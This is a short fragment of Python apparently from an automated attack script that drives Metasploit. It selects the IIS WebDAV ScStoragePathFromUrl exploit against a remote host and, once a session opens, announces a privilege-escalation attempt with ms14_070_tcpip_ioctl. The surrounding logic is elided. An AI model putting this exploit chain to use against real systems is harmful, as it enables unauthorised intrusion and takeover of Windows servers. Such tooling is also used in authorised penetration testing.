...
metasploit_executor.set_exploit_module("windows/iis/iis_webdav_scstoragepathfromurl", RHOST)
...
if initial_session:
    ...
    print("\n[*] Attempting privilege escalation with ms14_070_tcpip_ioctl using console-based method...")
